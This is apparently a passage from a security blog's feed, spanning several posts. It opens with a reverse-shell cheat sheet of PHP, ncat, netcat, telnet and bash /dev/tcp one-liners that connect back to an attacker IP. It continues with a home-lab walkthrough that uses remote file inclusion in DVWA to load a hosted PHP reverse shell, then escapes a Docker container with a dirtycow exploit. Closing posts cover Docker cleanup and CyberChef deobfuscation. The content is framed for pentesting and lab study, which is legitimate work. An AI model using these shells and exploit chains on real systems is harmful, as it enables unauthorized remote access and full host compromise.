&lt;p&gt;And therein lies the problem. Bind shells are great, but they’re irresponsible. If you can bind to the port, anyone else can. If you’re part of a real engagement for a customer or doing something in house, you can’t leave bind shells everywhere, it’s like leaving windows open for burglars. If someone is already inside the client’s network,  you’ve just made their job that much easier when your goal is the opposite. Use reverse shells, encrypt when possible, and clean up after yourself. Relatedly, if you’re uploading a file to an externally available site like a web shell, don’t name it admin.php or shell.php. Use a complex naming schema that can’t be brute forced or ideally a tag that can be found repeatedly. Something like remotephone_j1er234.php is harder to brute force and way easier to track down for cleanup.&lt;/p&gt;

&lt;h2 id=&quot;lets-begin&quot;&gt;Let’s begin!&lt;/h2&gt;

&lt;p&gt;Don’t be lazy. You shouldn’t be trying to get a shell back unless you have a good idea of what the underlying OS is. Each one of these can be adjusted and may need to be. It’s possible you know you have a linux type OS, but what if bash is in /usr/bin/ instead of /bin/? Do some recon, know what you’re working with, and, if you really have every reason to believe you should be getting a shell but you aren’t, always assume you’ve done something wrong. It’s usually the safe bet.&lt;/p&gt;

&lt;h3 id=&quot;php&quot;&gt;PHP&lt;/h3&gt;

&lt;p&gt;This is a very generic PHP reverse shell. It runs PHP inside of itself to send a connection back with /bin/sh&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;'&amp;lt;?php  echo shell_exec(php -r '$sock=fsockopen(&quot;&amp;lt;IP&amp;gt;&quot;,&amp;lt;PORT&amp;gt;);exec(&quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&quot;); ?&amp;gt;'
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here are a lot of variations on a theme. Each one worked for something different (some didn’t work at all, but might for you), and others are just interesting.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;'&amp;lt;?php -r fsockopen(&quot;&amp;lt;ATTACKIP&amp;gt;&quot;,443); exec(&quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&quot;); ?&amp;gt;'
'&amp;lt;?php $s=fsockopen(&quot;&amp;lt;ATTACKIP&amp;gt;&quot;,443);exec(&quot;/bin/sh -i &amp;lt;&amp;amp;4 &amp;gt;&amp;amp;4 2&amp;gt;&amp;amp;4&quot;);?&amp;gt;'
'&amp;lt;?php exec(&quot;/bin/sh | /bin/nc &amp;lt;ATTACKIP&amp;gt; 443&quot;);?&amp;gt;'
'&amp;lt;?php $sock=fsockopen(&quot;&amp;lt;ATTACKIP&amp;gt;&quot;,443);exec(&quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&quot;);?&amp;gt;'
'&amp;lt;?php set_time_limit (20);$sock=fsockopen(&quot;&amp;lt;ATTACKIP&amp;gt;&quot;,443);exec(&quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&quot;);?&amp;gt;'
'&amp;lt;?php $sock=fsockopen(&quot;&amp;lt;ATTACKIP&amp;gt;&quot;,443);exec(&quot;/bin/sh -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;ATTACKIP&amp;gt;/443 0&amp;gt;&amp;amp;1&quot;);?&amp;gt;'
'&amp;lt;?php shell_exec(&quot;/bin/sh -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;ATTACKIP&amp;gt;/443 0&amp;gt;&amp;amp;1&quot;);?&amp;gt;'
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;No matter what’s different with each one, every single one is calling a command shell, sending it over a network connection to the port you want. Every example is using port 443, so adjust that as you need to adjust it. Also, note that it’s suspicious to send non-HTTPS traffic over 443, so keep that in mind if you’re dealing with deep packet inspection or an attentive analyst. It might be more useful to use meterpreter reverse_https for something like that.&lt;/p&gt;

&lt;h3 id=&quot;ncat-and-nc&quot;&gt;Ncat and nc&lt;/h3&gt;

&lt;p&gt;Ncat and nc are great tools. You can do a ton with each one, but ncat is just a whole other level for what it allows you to accomplish. While nc is the traditional tool, ncat comes from the same people who produce nmap and includes tons more features including ssl support and the ability to restrict access!&lt;/p&gt;

&lt;p&gt;Of course, you’ll have to work these into your exploit. To create a bind shell that only allows a specific IP to connect to it, use&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ncat -lvp 4445 -e cmd.exe --allow &amp;lt;ATTACKIP&amp;gt; --ssl
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;To do this even more safely, use a reverse shell&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ncat -v &amp;lt;attackIP&amp;gt; 443 -e cmd.exe --ssl
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;non-netcat-shells&quot;&gt;Non-netcat Shells&lt;/h3&gt;

&lt;p&gt;This one is really clunky, but it works when you just can’t get anything else working. For this to work, you need two listeners and your shell will show up on the second one. It’s a complete mess, but it works and it’s just kind of nifty to see.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;telnet &amp;lt;ATTACKIP&amp;gt; 443 | /bin/sh | telnet &amp;lt;ATTACKIP&amp;gt; 444
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This one came from &lt;a href=&quot;https://twitter.com/webpentest/status/424165659518316544&quot;&gt;this&lt;/a&gt; tweet and it’s interesting.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/bin/bash -l &amp;gt; /dev/tcp/&amp;lt;ATTACKIP&amp;gt;/&amp;lt;ATTACKPORT&amp;gt; 0&amp;lt;&amp;amp;1 2&amp;gt;&amp;amp;1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Another interesting telnet shell&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rm -f /tmp/p; mknod /tmp/p p &amp;amp;&amp;amp; telnet &amp;lt;ATTACKIP&amp;gt; &amp;lt;ATTACKPORT&amp;gt; 0/tmp/p
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;sources&quot;&gt;Sources&lt;/h4&gt;

&lt;p&gt;“If I’ve seen so far, it’s because I’ve stolen the shoulders of giants” or something.&lt;/p&gt;

&lt;p&gt;These are some great resources for some of the shells I’ve included above. Learn from others, modify it, and share!&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&quot;&gt;The one&lt;/a&gt; everyone seems to link&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://highon.coffee/blog/reverse-shell-cheat-sheet/&quot;&gt;Variations&lt;/a&gt; on the theme.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html&quot;&gt;Oldy&lt;/a&gt; but goody&lt;/p&gt;</content><author><name></name></author><summary type="html">Cause everyone posts one</summary></entry><entry><title type="html">Attacking Yourself First</title><link href="http://localhost:4000/2016/12/27/attacking-yourself-first.html" rel="alternate" type="text/html" title="Attacking Yourself First" /><published>2016-12-27T23:43:12-06:00</published><updated>2016-12-27T23:43:12-06:00</updated><id>http://localhost:4000/2016/12/27/attacking-yourself-first</id><content type="html" xml:base="http://localhost:4000/2016/12/27/attacking-yourself-first.html">&lt;h2 id=&quot;why-not-just-attack-someone-else&quot;&gt;Why not just attack someone else?&lt;/h2&gt;

&lt;p&gt;Because it’s illegal.&lt;/p&gt;

&lt;h3 id=&quot;attacking-a-home-lab&quot;&gt;Attacking a home lab&lt;/h3&gt;

&lt;p&gt;If you’re doing this on a budget, you have a few ways to go about this. You can either use old machines you have laying around to install OSes and applications on and attack those systems or you can do something virtualized. Since I’m doing this on a budget and don’t want to reinstall OSes all day, I’m doing this virtualized. I’ll be doing this in docker again because why not, but you could just as easily do something in a VM and snapshot it before you really attack. I also am very interested in how docker and containers complicate breaking into systems, so this is as good of a time as any to figure it out.&lt;/p&gt;

&lt;p&gt;For this lab, I’m using a docker container of LAMP and a local installation of Damn Vulnerable Web Applications. Let’s first get our docker container.&lt;/p&gt;

&lt;h3 id=&quot;ok-lets-go&quot;&gt;OK let’s go&lt;/h3&gt;

&lt;p&gt;I’m working off a different Ubuntu image than I usually work off of because I want to be sure my exploits will work (cheating, I know). If we go &lt;a href=&quot;http://releases.ubuntu.com/&quot;&gt;here&lt;/a&gt; we can find old version of Ubuntu and it even tags the date they were released. I downloaded and installed Server 14.04.5 and installed a few applications&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;Install the OS, select the SSH Server as the additional functionality&amp;gt;
sudo apt-get install git docker.io
sudo usermod -aG docker $USER
&amp;lt;reboot or log out and back in&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;That’s enough believe it or not, the rest will come with our container.&lt;/p&gt;

&lt;p&gt;Getting this figured out took longer than I expected, but if you check &lt;a href=&quot;https://github.com/remotephone&quot;&gt;my github&lt;/a&gt; page you’ll see a repo for dvwa-lamp. This is a docker container than includes the &lt;a href=&quot;https://github.com/ethicalhack3r/DVWA&quot;&gt;Damn Vulnerable Web App&lt;/a&gt; bundled inside a lamp container I forked off &lt;a href=&quot;https://github.com/tutumcloud/lamp&quot;&gt;tutum&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;You can follow the instructions in the README or do just do this:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/remotephone/dvwa-lamp.git
cd dvwa-lamp
docker build -t remotephone/dvwa-lamp .
docker run -d -p 80:80 -p 3306:3306 remotephone/dvwa-lamp 
&amp;lt;wait some seconds and then browse to...&amp;gt;
http://&amp;lt;Victim IP&amp;gt;/setup.php
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And you’re set! Install the database by completed the setup and login as admin/password.&lt;/p&gt;

&lt;h3 id=&quot;explotiation-and-notes&quot;&gt;Explotiation and notes&lt;/h3&gt;

&lt;p&gt;Now let’s get started. We’re going to move from a web app to a Docker container and see if we can make it to the host. For the purposes of this demo, I’m going easy mode, we’re going to set the security level to “Low” in DVWA Security in the sidebar and then go to the File Inclusion tests.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.offensive-security.com/metasploit-unleashed/file-inclusion-vulnerabilities/&quot;&gt;Remote File Inclusion&lt;/a&gt; is a nasty vulnerability that allows you to manipulate insecurely coded requests for resources to instead call to resources you control. While the web server may intend to display information from a local file on the webserver, you can instead redirect the webserver to call a file you host and even execute the code if the server knows how to interpret it. One of the most simple examples is tricking a server to  call a php script you host and excuting that to send you a reverse shell.&lt;/p&gt;

&lt;p&gt;For this exercise, I’ll use &lt;a href=&quot;https://blog.secureideas.com/2014/01/professionally-evil-software-laudanum.html&quot;&gt;laudunum&lt;/a&gt;. While the link for the latest release doesn’t work, you can find it in the laudunum package as part of Kali linux. We’re going to use the RFI vulnerability to call a webshell we host on our local web server, listen with ncat to catch our reverse shell, use the shell to upload a kernel exploit, and see if we can use that to escape our container.&lt;/p&gt;

&lt;p&gt;To make this work, you need a few things. First, get your container running. Next, get you webshells ready in your /var/www/html directory. I’m using php-reverse-shell.php from the laudunum package and I’ve updated the file to point back to my attacking server. I always use ports 443 or 80 if possible for reverse shells, firewalls tend to allow this traffic out and it’s not suspicious if someone netstats an affected server. This is the part of the webshell I modified:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$VERSION = &quot;1.0&quot;;
$ip = '192.168.1.20';  // CHANGE THIS
$port = 443;       // CHANGE THIS
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It’s conveniently marked with “CHANGE THIS” so you know what to update. If you want to change some of the actions under $shell, you can, especially if for some reason bash or sh is not in the /bin/ directory. Now let’s get a shell.&lt;/p&gt;

&lt;h3 id=&quot;getting-your-foot-in-the-door&quot;&gt;Getting your foot in the door&lt;/h3&gt;

&lt;p&gt;First we’ll go to the File Inclusion page. At this point, my attacking machine has apache running, I’ve copied and fixed my reverse shell, hosted it in my /var/www/html folder, renamed it something short and easy to call, I’ve started a nc listener with nc -nlvp 443 and I’ve browsed to the RFI page (whew). The RFI is easy peasy here, this request in your browser will trigger it:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://192.168.1.16/vulnerabilities/fi/?page=http://192.168.1.20/php.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It’s important to use the .txt extension since using .php will cause your own system to interpret the script and you’ll reverse shell yourself, which isn’t as exciting. In this particular page, you can View Source to see the site isn’t doing anything to append anything to your requested page, so you don’t need to use null characters to terminate the request.&lt;/p&gt;

&lt;h3 id=&quot;poking-around-and-enumeration&quot;&gt;Poking Around and Enumeration&lt;/h3&gt;

&lt;p&gt;Now we’ve got a reverse shell. Now what? It’s time to enumerate. Since I borrowed this container from tutum, there was some learning I had to do. If we enumerate the kernels, we learn that we’re running a version that’s vulnerable to dirtyc0w. Since the container is simply an “isolated” sandbox on the VM, we can expect it to be running the same kernel version as the VM, and we’re right (some IPs might not match in screenshots because I’ve messed with VMs quite a bit for other stuff since I started this post, but the idea is the same):&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/kernels.png&quot; alt=&quot;Kernels&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;For giggles, let’s run a Centos container and see what it’s running under the hood.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/Centosbuntu.png&quot; alt=&quot;Centosbuntu&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;That’s interesting! There’s no difference between the kernel in the container and the one in the VM. It’d be interesting to see how important that is for packages that expect to be run in CentOS, but that’s kind of outside the scope of what I’m doing. Let’s keep moving forward.&lt;/p&gt;

&lt;h3 id=&quot;picking-an-exploit&quot;&gt;Picking an Exploit&lt;/h3&gt;

&lt;p&gt;We need to pick an exploit that works and gets us to the host. The fact that we’re in a container means userspace exploits are useless. Even if you escalate to root inside the container, you still don’t own the host. You need to exploit a kernel vulnerability in a way that let’s you get out of the confines of the container.&lt;/p&gt;

&lt;p&gt;Lot’s of the &lt;a href=&quot;https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs&quot;&gt;dirtyc0w POC’s&lt;/a&gt; I’ve seen give you rights to modify files as root and other things, which, even if they do affect the underlying OS, don’t give you a way to take advantage of that from your session. Scumjr published an exploit that somewhat reliably allows you to escape the container &lt;a href=&quot;https://github.com/scumjr/dirtycow-vdso&quot;&gt;here&lt;/a&gt;. It’s glorious. You’ll need gcc, make, and nasm installed to compile this.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.aporeto.com/dirty-cow-story-privilege-escalation-vulnerability/&quot;&gt;This article&lt;/a&gt; breaks down really well how the exploit we’re going to use breaks out of the confines of the container. In short, it manipulates memory space shared between the container and host and tricks processes checking the systemtime in that memory space to trigger the exploit, sending you a shell from the host (pretty sure that’s right, tell me if I’m not).&lt;/p&gt;

&lt;p&gt;If we have a vulnerable kernel, we need to get our exploit to the box. How do we do that? We could echo it line by line into a file, but that’s so painful over a reverse shell. If we check for applications on the server, we are missing things like wget, curl, and fetch. We do have python, perl, so that’s nice. If we go a little further and check the /usr/bin directory, we find sftp. That’s handy, but it came from an installation of git and openssh-client, which we really can’t depend on.&lt;/p&gt;

&lt;h3 id=&quot;living-off-the-land-when-youre-in-a-desert&quot;&gt;Living off the land when you’re in a desert&lt;/h3&gt;

&lt;p&gt;Check for yourself in a default Ubuntu container, lots of the stuff we’d typically rely on getting files into and out of a server we’re in aren’t there. No ftp, no tftp, no wget, curl, fetch, etc etc. This complicates getting our exploit code on to the server. Once it’s there, you’ll find there’s usually nothing to compile it either.&lt;/p&gt;

&lt;p&gt;In the spirit of living off the land, let’s start with what got us here to begin with, php. We have rights to the system, we can move around in a shell, let’s see if we can execute arbitrary php. This isn’t pretty, but it proves my point, we can execute arbitrary php commands.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/whichesphp.png&quot; alt=&quot;Whiches and php&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So great, we can move stuff in and out, but you can see we can’t even compile anything locally once it’s on there. I checked a handful of popular containers like the CentOS one, redis, and jenkins and they all come pretty bare. These are some results from redis and jenkins:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/whichredisjenkins.png&quot; alt=&quot;Installed default packages&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I don’t really know a lot of ways to deal with this gracefully. If you don’t have anything on the system and you can’t or don’t want to install additional packages, the only option I know is compiling it elsewhere and bringing it to the server. Let’s find somewhere we can write to, then we’ll use php to bring in our exploit. We need somewhere we can write to, and /tmp is often available. The same is the case here:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ls -asl /tmp
total 8
4 drwxrwxrwt  2 root root 4096 Jan 12 03:21 .
4 drwxr-xr-x 54 root root 4096 Jan 12 03:21 ..
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;compiling-your-exploit&quot;&gt;Compiling your exploit.&lt;/h3&gt;

&lt;p&gt;We already know the kernel version, 4.4.0-31 and we don’t have an image laying around with that particular version, but we do have an updated image in an VM we have sitting around. To install the appropriate kernel, we need to find it. Search &amp;lt;distroname&amp;gt; &amp;lt;kernelversion&amp;gt; in google and you’ll hopefully find something like &lt;a href=&quot;http://packages.ubuntu.com/xenial/amd64/linux-image-4.4.0-31-generic/download&quot;&gt;this page&lt;/a&gt; where you can download and install the kernel with:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dpkg -i linux-image-4.4.0-31-generic_4.4.0-31.50_amd64.deb
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;You might also need the image-extra or headers package. Reboot into your new kernel, make sure you have the appropriate packages installed, then compile it. If you don’t have everything installed, this is the full process:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt-get install git nasm make gcc
git clone https://github.com/scumjr/dirtycow-vdso.git
cd dirtycow-vdso
make
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now move the file off your test system, on to your attacking host and into your /var/www/html folder. From here, you should be able to get into /tmp, pull the file into your victim host, change permissions, run the exploit, and get your shell. Since you’re sending a shell back to your container from the host, you need to make sure you send it to the proper IP. By default, the exploit uses 127.0.0.1, which will not work. You only get one chance with this exploit if it goes wrong, so make sure you send it to the docker eth0 and you’ll get your shell back as root inside the host!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/fullescape.png&quot; alt=&quot;Full Escape&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And there you go, you’ve successfully gone from a web application, to a container shell, to a full host escape and root! Sobering stuff.&lt;/p&gt;

&lt;h3 id=&quot;lessons-learned&quot;&gt;Lessons Learned&lt;/h3&gt;

&lt;p&gt;Containers are not a panacea. They won’t mean you’re 100% secure, but they do put some difficult restrictions around attackers. Unless they haven’t gotten around to patching dirtyc0w (which wouldn’t be &lt;em&gt;that&lt;/em&gt; surprising), you better be sitting on some creative ways of interacting with the kernel if you want to escape a container. As people get better with containers, best practices get better defined, and things like &lt;a href=&quot;https://clearlinux.org/&quot;&gt;Clear Linux&lt;/a&gt; really take off, I think it’s only going to get more interesting for attackers and pen testers.&lt;/p&gt;

&lt;p&gt;Thanks!&lt;/p&gt;</content><author><name></name></author><summary type="html">Why not just attack someone else?</summary></entry><entry><title type="html">Practical Docker for Security Admins - Part 2</title><link href="http://localhost:4000/lab/homelab/budget/testing/2016/12/26/practical-docker-part2.html" rel="alternate" type="text/html" title="Practical Docker for Security Admins - Part 2" /><published>2016-12-26T22:15:33-06:00</published><updated>2016-12-26T22:15:33-06:00</updated><id>http://localhost:4000/lab/homelab/budget/testing/2016/12/26/practical-docker-part2</id><content type="html" xml:base="http://localhost:4000/lab/homelab/budget/testing/2016/12/26/practical-docker-part2.html">&lt;h2 id=&quot;more-test-cases-but-first-some-housekeeping&quot;&gt;More test cases, but first, some housekeeping&lt;/h2&gt;

&lt;p&gt;Docker will fill up disk space quickly if you’re not managing it actively or planning for it. Since I use throw away VMs for my docker containers, I don’t give them a lot of disk space to fill up. When your splunking through large indexes of data, you can very quickly fill up a virtual disk. There’s a few ways I’ve found to manage the data.&lt;/p&gt;

&lt;h3 id=&quot;clean-up-after-yourself&quot;&gt;Clean up after yourself&lt;/h3&gt;

&lt;p&gt;Similar to how you run something with docker run, docker has it’s own utilities to manage and inspect containers. Docker ps allows you to view running containers on your system. docker ps -qa gives you a quick view of just the container names. So far, on this VM, I’ve built my splunk docker image from the last page, I’ve created a container with splunk, and added some data to it.&lt;/p&gt;

&lt;p&gt;Let’s see what docker ps and some related commands show us:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/dockerps.png&quot; alt=&quot;docker ps&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ok, nothing too crazy. The first command was verbose, showing us all the container data, like ports forwarded, the name, etc etc. The next one was just a quick oneliner of the container ID. Then we killed that container and started up a new one. If we look at running containers again, we only see a single container. The next command is where stuff get’s interesting, because docker ps -qa shows us 2 containers, one of which matches the terminated container! It didn’t clean up after us, so we need to do that ourselves.&lt;/p&gt;

&lt;p&gt;Speaking of didn’t clean up after us, remember that container we built? If you watched the build process, you’ll remember it spun up some intermediate containers. Let’s see if they left anything behind. I saved myself some trouble here by piping it to xargs and cleaning up at once.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/dockerdanglers.png&quot; alt=&quot;docker danglers&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ok wow, so that’s quite a few volumes we cleaned up. These were the residual images from the intermediate containers that were built. None of this stuff goes away on it’s own, so just keep an eye on your disk space as you’re building and throwing things away, it will catch up to you eventually.&lt;/p&gt;

&lt;p&gt;Here’s what I run to completely clean up, courtsey of &lt;a href=&quot;http://blog.yohanliyanage.com/2015/05/docker-clean-up-after-yourself/&quot;&gt;this site&lt;/a&gt; and &lt;a href=&quot;https://lebkowski.name/docker-volumes/&quot;&gt;this one&lt;/a&gt; and some tinkering:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker stop $(docker ps -a -q)
docker rm $(docker ps -a -q)
docker volume ls -qf dangling=true | xargs -r docker volume rm
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This string of commands stops all running containers, removes the container images and then removes associated volumes. You can also just run the second one if you just want to delet all currently stopped containers.&lt;/p&gt;

&lt;p&gt;Furthermore, you could have container images left on your disk taking up space. To see what images you have, use docker images -qa. That will list them all. Then, you can use docker rmi to remove unnecessary images. You can always rebuild this stuff if you delete it, so consider whether you prefer disk space or download time and make your choices accordingly.&lt;/p&gt;

&lt;h3 id=&quot;cyberchef&quot;&gt;CyberChef&lt;/h3&gt;

&lt;p&gt;This tool is pretty exciting. Most everything Cyberchef can do has been possible one way or another, but I’ve never seen anything combine so many features in one single tool. You can encrypt, decrypt, encode, decode, deobfuscate and blah blah blah all day. It’s really pretty impressive.&lt;/p&gt;

&lt;p&gt;First you need to install CyberChef locally. I understand any concerns about installing something from GCHQ, but if you’re worried, do it in a VM and restore a snapshot when youre done. If you’re really really worried, maybe reevaluate what you’re doing on your computer. To install on Ubuntu 16.04, fully updated as of Dec 2016,&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt-get install git nodejs npm
npm install -g grunt-cli
git clone https://github.com/gchq/CyberChef.git
cd CyberChef
npm install
docker run -dit -p 8888:80 -v /home/ubuntu/gits/CyberChef/:/usr/local/apache2/htdocs httpd
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;Not really sure what changed here, but on 4/14/17 when I set this up again, I had to be in the Cyberchef directory and run “sudo grunt prod” before it would populate the prod directory.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Of course, replace directories as appropriate. If you go to your forwarded (or not) port in your browser and the build/prod/ directory, you have a working instance of cyberchef! Let’s pull a random sample from the internet and see if we can decode it. I first chose the sample from this &lt;a href=&quot;https://isc.sans.edu/forums/diary/Obfuscated+SQL+Injection+attacks/9397/&quot;&gt;page&lt;/a&gt;. This sample will be good because we can check our work against their results.&lt;/p&gt;

&lt;p&gt;We’re looking at this as though our IDS alert or packet capture of malicious traffic came to our desk for analysis. First, let’s clean up the code a little bit using Generic Code Beautify and URL Decode.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/cyberchefdeob1.PNG&quot; alt=&quot;Debofus 1&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So that’s a bit clearer, let’s decode the hex.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/cyberchefdeob2.PNG&quot; alt=&quot;Deobfus2&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Well that broke the rest of the syntax, but that’s why we take notes right? As I’m decoding something like this, I create a step by step log of what I’ve changed so I can retrace why what I did worked.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/cyberchefdeobnotes.PNG&quot; alt=&quot;Deobfus Notes&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If we decode the final string, we see the malicious URL that was being injected into the database. I had to run two hex decodes before it decoded everything, but depending on how packed the payload is, you may have to run any number of operations.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/cyberchefdeob3.PNG&quot; alt=&quot;Deobfus3&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There is a Flow Control section in CyberChef that I think might help eliminate the need to take notes as you go and do it all in one operation, but I haven’t figured it out. If anyone reading this knows how to maek that happen, I’d love to hear it.&lt;/p&gt;

&lt;h2 id=&quot;so-now-what&quot;&gt;So now what?&lt;/h2&gt;

&lt;p&gt;Now that we have our malicious payload decoded, we can determine our next moves. Since this began as SQL injection, let’s see if this string is anywhere in the database. If this infected an internal site, we probably need to figure out what that URL does, how we can update IDS/IPS signatures to help with that, and examine DNS and firewall records for any evidence of users or systems visiting that URL. If it’s customer facing, it’s probably time to work with the lawyers and find out what this means.&lt;/p&gt;

&lt;p&gt;Of course, there’s tons of ways to do this. You could actually do all of what I did with notepad++ add ons, you could do it with command line decoders, or you could do it all manually. CyberChef is one tool that might not work all the time, but looks like it has a lot of potential.&lt;/p&gt;</content><author><name></name></author><summary type="html">More test cases, but first, some housekeeping</summary></entry><entry><title type="html">Practical Docker for Security Admins - Part 1</title><link href="http://localhost:4000/lab/homelab/budget/testing/2016/12/20/practical-docker.html" rel="alternate" type="text/html" title="Practical Docker for Security Admins - Part 1" /><published>2016-12-20T16:29:15-06:00</published><updated>2016-12-20T16:29:15-06:00</updated><id>http://localhost:4000/lab/homelab/budget/testing/2016/12/20/practical-docker</id><content type="html" xml:base="http://localhost:4000/lab/homelab/budget/testing/2016/12/20/practical-docker.html">&lt;p&gt;&lt;a href=&quot;https://www.docker.com/&quot;&gt;Docker&lt;/a&gt; and containers are pretty nifty.  You can run applications or even OSes inside containers (sort of, it shares a kernel with the host OS and there’s still at least some ways to escape a container to get to the host). The beauty of it to me is how throwaway it is. I saw a presentation where someone started 